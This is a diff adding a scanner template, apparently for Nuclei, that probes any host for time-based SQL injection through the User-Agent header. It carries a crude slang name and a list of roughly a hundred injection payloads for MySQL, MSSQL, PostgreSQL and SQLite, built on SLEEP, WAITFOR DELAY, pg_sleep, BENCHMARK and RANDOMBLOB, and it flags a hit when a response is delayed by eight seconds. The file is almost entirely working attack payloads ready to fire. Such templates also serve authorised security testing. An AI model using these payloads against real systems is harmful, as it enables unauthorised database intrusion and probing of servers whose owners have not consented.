@@ -1,0 +1,114 @@
+id: sqli-based-useragent
+info:
+  name: Ngentot
+  author: banditz Cyber
+  severity: critical
+  description: |
+    banditz cyber test SQLI time based
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+    headers:
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: '{{reflection}}'
+    payloads:
+      reflection:
+        - ' OR IF(1=1, SLEEP(8), 0) -- '
+        - ' OR IF(1=2, SLEEP(8), 0) -- '
+        - ' OR IF(1=1, SLEEP(8), 0) -- '
+        - '1 or sleep(8)#'
+        - '" or sleep(8)#'
+        - 'zor sleep(8)#'
+        - '1) or sleep(8)#'
+        - '") or sleep(8)#'
+        - '") or sleep(8)#'
+        - ' 1)) or sleep(8)# '
+        - '")) or sleep(8)#'
+        - '")) or sleep(8)#'
+        - '";waitfor delay 0:0:8--'
+        - '";waitfor delay 0:0:8--'
+        - ';waitfor delay 0:0:8--'
+        - '";waitfor delay 0:0:8--'
+        - ');waitfor delay 0:0:8--'
+        - '");waitfor delay 0:0:8--'
+        - '));waitfor delay 0:0:8--'
+        - '"));waitfor delay 0:0:8--'
+        - 'benchmark(10000000,MD5(1))#'
+        - '1 or benchmark(10000000,MD5(1))#'
+        - '" or benchmark(10000000,MD5(1))#'
+        - ' or benchmark(10000000,MD5(1))#'
+        - '1) or benchmark(10000000,MD5(1))#'
+        - '") or benchmark(10000000,MD5(1))#'
+        - ') or benchmark(10000000,MD5(1))#'
+        - '1)) or benchmark(10000000,MD5(1))#'
+        - '")) or benchmark(10000000,MD5(1))#'
+        - '"))) or benchmark(10000000,MD5(1))#'
+        - 'pg_sleep(8)--'
+        - '1 or pg_sleep(8)--'
+        - '" or pg_sleep(8)--'
+        - ' or pg_sleep(8)--'
+        - '1) or pg_sleep(8)--'
+        - '") or pg_sleep(8)--'
+        - ') or pg_sleep(8)--'
+        - '1)) or pg_sleep(8)--'
+        - '")) or pg_sleep(8)--'
+        - '"))) or pg_sleep(8)--'
+        - 'AND (SELECT * FROM (SELECT(SLEEP(8)))bAKL) AND vRxe = vRxe'
+        - 'AND (SELECT * FROM (SELECT(SLEEP(8)))YjoC) AND %='
+        - 'AND (SELECT * FROM (SELECT(SLEEP(8)))nQIP)'
+        - 'AND (SELECT * FROM (SELECT(SLEEP(8)))nQIP)--'
+        - 'AND (SELECT * FROM (SELECT(SLEEP(8)))nQIP)#'
+        - 'SLEEP(8)#'
+        - 'SLEEP(8)--'
+        - 'SLEEP(8)='
+        - 'or SLEEP(8)'
+        - 'or SLEEP(8)#'
+        - 'or SLEEP(8)--'
+        - 'or SLEEP(8)= '
+        - 'waitfor delay 00:00:08 '
+        - 'waitfor delay 00:00:08 --'
+        - 'waitfor delay 00:00:08 #'
+        - 'benchmark(50000000,MD5(1))'
+        - 'benchmark(50000000,MD5(1))--'
+        - 'benchmark(50000000,MD5(1))#'
+        - 'or benchmark(50000000,MD5(1))'
+        - 'or benchmark(50000000,MD5(1))--'
+        - 'or benchmark(50000000,MD5(1))#'
+        - 'pg_SLEEP(8)'
+        - 'pg_SLEEP(8)--'
+        - 'pg_SLEEP(8)#'
+        - 'or pg_SLEEP(8)'
+        - 'or pg_SLEEP(8)--'
+        - 'or pg_SLEEP(8)#'
+        - 'AnD SLEEP(8)'
+        - 'AnD SLEEP(8)--'
+        - 'AnD SLEEP(8)#'
+        - '&&SLEEP(8)'
+        - '&&SLEEP(8)--'
+        - '&&SLEEP(8)#'
+        - ' AnD SLEEP(8) ANd 1'
+        - '&&SLEEP(8)&& 1'
+        - 'ORDER BY SLEEP(8)'
+        - 'ORDER BY SLEEP(8)--'
+        - 'ORDER BY SLEEP(8)#'
+        - '(SELECT * FROM (SELECT(SLEEP(8)))ecMj)'
+        - '(SELECT * FROM (SELECT(SLEEP(8)))ecMj)#'
+        - '(SELECT * FROM (SELECT(SLEEP(8)))ecMj)--'
+        - '+benchmark(3200,SHA1(1))+'
+        - '+ SLEEP(10) + '
+        - 'RANDOMBLOB(500000000/2)'
+        - 'AND 2947=LIKE(ABCDEFG,UPPER(HEX(RANDOMBLOB(500000000/2))))'
+        - 'OR 2947=LIKE(ABCDEFG,UPPER(HEX(RANDOMBLOB(500000000/2))))'
+        - 'RANDOMBLOB(1000000000/2)'
+        - 'AND 2947=LIKE(BCDEFG,UPPER(HEX(RANDOMBLOB(1000000000/2))))'
+        - 'OR 2947=LIKE(ABCDEFG,UPPER(HEX(RANDOMBLOB(1000000000/2))))'
+        - 'SLEEP(1)/* or SLEEP(1) or " or SLEEP(1) or "*/'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=8'
+
